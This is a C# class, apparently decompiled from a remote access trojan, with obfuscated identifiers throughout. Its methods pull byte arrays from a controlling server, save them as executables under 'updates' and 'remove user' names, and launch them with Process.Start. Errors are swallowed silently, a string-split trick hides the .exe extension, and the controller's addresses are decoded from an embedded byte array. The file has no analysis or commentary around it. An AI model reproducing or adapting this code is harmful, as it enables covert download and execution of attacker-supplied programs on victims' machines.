using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace rgiwsdasxa;

internal class rgiwsdasxaOCMD
{
	public rgiwsdasxaMCDM server;

	public rgiwsdasxaOCMD(rgiwsdasxaMCDM lID)
	{
		server = lID;
	}

	public void rgiwsdasxado_updated(int uType, string switchType)
	{
		try
		{
			byte[] array = server.rgiwsdasxapull_data();
			if (uType == 7 && array != null)
			{
				string text = rgiwsdasxaCONF.rgiwsdasxaget_mpath() + "updates\\";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(text + rgiwsdasxaCONF.rgiwsdasxamainApp + ".exe|rgiwsdasxa".Split(new char[1] { '|' })[0], array);
				rgiwsdasxado_process(text + rgiwsdasxaCONF.rgiwsdasxamainApp + ".exe|rgiwsdasxa".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	public NetworkStream rgiwsdasxaNS(TcpClient rgiwsdasxatcpsck)
	{
		return rgiwsdasxatcpsck.GetStream();
	}

	public void rgiwsdasxado_process(string filePath)
	{
		try
		{
			Process.Start(filePath);
		}
		catch
		{
		}
	}

	public void rgiwsdasxaremove_user()
	{
		try
		{
			byte[] array = server.rgiwsdasxapull_data();
			if (array != null && !File.Exists(rgiwsdasxaCONF.rgiwsdasxaget_mpath() + rgiwsdasxaCONF.rgiwsdasxaremvUser + ".exe"))
			{
				File.WriteAllBytes(rgiwsdasxaCONF.rgiwsdasxaget_mpath() + rgiwsdasxaCONF.rgiwsdasxaremvUser + ".exe", array);
				rgiwsdasxado_process(rgiwsdasxaCONF.rgiwsdasxaget_mpath() + rgiwsdasxaCONF.rgiwsdasxaremvUser + ".exe");
			}
		}
		catch
		{
		}
	}

	public string rgiwsdasxaserverIPD()
	{
		return Encoding.UTF8.GetString(rgiwsdasxaCONF.rgiwsdasxavpsips, 0, rgiwsdasxaCONF.rgiwsdasxavpsips.Length);
	}
}
